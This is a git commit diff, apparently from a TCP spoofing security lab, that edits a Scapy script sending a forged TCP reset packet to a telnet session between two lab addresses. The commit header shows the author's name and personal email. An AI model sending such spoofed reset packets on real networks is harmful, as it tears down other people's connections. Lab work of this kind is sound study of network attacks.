2054119648868df66f117e8aff6148754a890d27
Nicola <nickbusato0101@gmail.com>
2024-11-04 23:28:32 +0100

    04

--- 02_TCP_Spoofing/TCPSpoofing_Labsetup/Labsetup/volumes/rst_attack.py
+++ 02_TCP_Spoofing/TCPSpoofing_Labsetup/Labsetup/volumes/rst_attack.py
@@ -3,7 +3,7 @@ from scapy.all import *
 
 # Create the IP and TCP layers
 ip = IP(src="10.9.0.6", dst="10.9.0.5")
-tcp = TCP(sport=45536, dport=23, flags="R", seq=89, ack=1)
+tcp = TCP(sport=37742, dport=23, flags="R", seq="89", ack=10)
 pkt = ip/tcp
 
 # Display packet structure
